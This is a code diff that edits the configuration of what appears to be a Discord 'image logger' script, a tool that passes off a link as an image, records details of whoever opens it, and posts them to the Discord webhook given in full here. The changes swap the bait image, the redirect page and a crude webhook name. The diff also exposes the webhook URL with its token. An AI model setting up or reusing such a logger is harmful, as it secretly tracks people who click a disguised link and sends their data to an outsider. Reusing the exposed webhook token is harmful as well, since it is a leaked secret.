@@ -12,12 +12,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1423180877126570049/XwXd2msakCDLPSXxGDEXeoIA3biSo1_W2qIaumyWD0A3RjfvibrXjXPLNyYwaSO7zi16",
-    "image": "https://th.bing.com/th/id/OIP.FX4HvEgRNT22ApJOk5fDyQHaEK?w=275&h=180&c=7&r=0&o=7&pid=1.7&rm=3", # You can also have a custom image by using a URL argument
+    "image": "https://www.youtube.com/watch?v=fxKMlbbMT50", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Shiro is here slaving", # Set this to the name you want the webhook to have
+    "username": "Ashihiros Bitch", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -50,7 +50,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://www.instagram.com/onlybonnieblue/" # Link to the webpage to redirect to 
+        "page": "https://www.youtube.com/watch?v=fxKMlbbMT50" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
